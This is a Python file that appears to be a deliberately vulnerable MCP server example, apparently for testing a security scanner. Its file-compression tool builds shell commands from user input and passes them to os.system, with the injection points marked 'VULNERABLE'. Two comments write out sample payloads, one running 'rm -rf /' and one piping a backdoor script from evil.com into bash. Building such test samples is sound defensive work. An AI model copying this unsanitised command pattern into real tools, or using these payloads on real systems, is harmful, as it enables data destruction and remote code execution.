# Copyright 2025 Cisco Systems, Inc. and its affiliates
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# SPDX-License-Identifier: Apache-2.0

"""Example 4: Complex OS System Injection with Archive Operations"""
from mcp import FastMCP
import os
import glob

app = FastMCP("injection-attacks-service-4")


class FileCompressor:
    """Handles file compression operations"""

    COMPRESSION_TYPES = {
        "gzip": "gzip -f",
        "bzip2": "bzip2 -f",
        "xz": "xz -f",
        "zip": "zip -r",
    }

    @staticmethod
    def compress(
        filename: str, compression_type: str = "gzip", output_name: str = None
    ) -> int:
        cmd_base = FileCompressor.COMPRESSION_TYPES.get(compression_type, "gzip -f")

        if output_name:
            if compression_type == "zip":
                # VULNERABLE: Command injection in output name
                cmd = f"{cmd_base} {output_name} {filename}"
            else:
                cmd = f"{cmd_base} -c {filename} > {output_name}"
        else:
            cmd = f"{cmd_base} {filename}"

        # VULNERABLE: Direct os.system call with user input
        return os.system(cmd)

    @staticmethod
    def compress_directory(
        directory: str, archive_name: str, compression_type: str = "gzip"
    ) -> int:
        if compression_type == "zip":
            cmd = f"zip -r {archive_name} {directory}"
        else:
            cmd = f"tar -czf {archive_name} {directory}"

        # VULNERABLE: Another injection point
        return os.system(cmd)


@app.tool()
def compress_file(
    filename: str,
    compression_type: str = "gzip",
    output_name: str = "",
    compress_directory: bool = False,
    preserve_original: bool = True,
) -> str:
    """
    Compress files or directories using various compression algorithms.
    """
    compressor = FileCompressor()

    # Check if file exists (weak validation)
    if not compress_directory and not os.path.exists(filename):
        return f"File not found: {filename}"

    # VULNERABLE: Command injection through filename parameter
    # User can inject: "file.txt; rm -rf / #"
    # Or: "file.txt && curl https://evil.com/backdoor.sh | bash"

    if compress_directory:
        # VULNERABLE: Directory compression injection
        if not output_name:
            output_name = f"{filename}.tar.gz"

        result = compressor.compress_directory(filename, output_name, compression_type)
    else:
        # VULNERABLE: File compression injection
        result = compressor.compress(filename, compression_type, output_name)

    if result == 0:
        return f"Compression successful: {filename}"
    else:
        return f"Compression failed with code: {result}"
